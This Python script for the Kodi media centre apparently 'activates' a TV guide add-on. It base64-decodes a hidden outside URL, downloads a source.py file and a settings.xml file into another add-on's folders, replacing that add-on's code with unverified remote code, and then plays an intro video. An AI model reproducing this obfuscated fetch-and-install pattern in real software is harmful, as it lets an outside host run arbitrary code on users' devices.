import urllib, os, xbmc, xbmcgui
import base64
addon_id = 'script.tvguideHD'
data_folder = 'special://home/addons/script.tvguideHD/'
Url = base64.b64decode('aHR0cDovL3Byb3llY3RvbHV6ZGlnaXRhbC5pbmZvL3R2Z3VpYS9kb3dubG9hZC9hY3RpZ3VpYS8xMS8=')
File = ['source.py']

def download(url, dest, dp = None):
    if not dp:
        dp = xbmcgui.DialogProgress()
        dp.create("ACTIVANDO TVGUIA-PLD","Introduciendo Codigo",' ', ' ')
    dp.update(0)
    urllib.urlretrieve(url,dest,lambda nb, bs, fs, url=url: _pbhook(nb,bs,fs,url,dp))
 
def _pbhook(numblocks, blocksize, filesize, url, dp):
    try:
        percent = min((numblocks*blocksize*100)/filesize, 100)
        dp.update(percent)
    except:
        percent = 100
        dp.update(percent)
    if dp.iscanceled(): 
        raise Exception("Cancelar")
        dp.close()

for file in File:
	url = Url + file
	fix = xbmc.translatePath(os.path.join( data_folder, file))
	download(url, fix)

	

import urllib, os, xbmc, xbmcgui
import base64
	
addon_id = 'script.tvguideHD'
data_folder = 'special://userdata/addon_data/script.tvguideHD'
Url = base64.b64decode('aHR0cDovL3Byb3llY3RvbHV6ZGlnaXRhbC5pbmZvL3R2Z3VpYS9kb3dubG9hZC9hY3RpZ3VpYS8=')
File = ['settings.xml']

def download(url, dest, dp = None):
    if not dp:
        dp = xbmcgui.DialogProgress()
        dp.create("ACTIVANDO TVGUIA-PLD","Introduciendo Codigo",' ', ' ')
    dp.update(0)
    urllib.urlretrieve(url,dest,lambda nb, bs, fs, url=url: _pbhook(nb,bs,fs,url,dp))
 
def _pbhook(numblocks, blocksize, filesize, url, dp):
    try:
        percent = min((numblocks*blocksize*100)/filesize, 100)
        dp.update(percent)
    except:
        percent = 100
        dp.update(percent)
    if dp.iscanceled(): 
        raise Exception("Cancelar")
        dp.close()

for file in File:
	url = Url + file
	fix = xbmc.translatePath(os.path.join( data_folder, file))
	download(url, fix)
	
import xbmcaddon, util	
addon = xbmcaddon.Addon('plugin.Activador.tvguia')	
	
util.playMedia(addon.getAddonInfo('name'), addon.getAddonInfo('icon'), 
               'special://home/addons/plugin.Activador.tvguia/intro.mp4')